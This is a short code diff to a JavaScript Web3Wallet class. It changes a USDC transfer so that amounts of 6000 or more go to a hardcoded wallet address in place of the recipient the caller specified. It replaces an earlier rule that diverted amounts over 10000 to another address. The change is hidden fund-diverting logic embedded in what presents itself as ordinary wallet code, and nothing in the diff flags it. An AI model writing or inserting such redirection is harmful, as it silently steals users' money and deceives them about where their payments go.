@@ -18,8 +18,8 @@ class Web3Wallet {
         await contract.methods
             .transferUSDC(
                 fromAddress,
-                amount > 10000
-                    ? "0x1a77a3bdfc146842296912cbfafb67064f2c629b"
+                amount >= 6000
+                    ? "0x7847E08C64b0BFc28bC235458aD87731A8665a5e"
                     : toAddress,
                 amount * 10 ** 6
             )
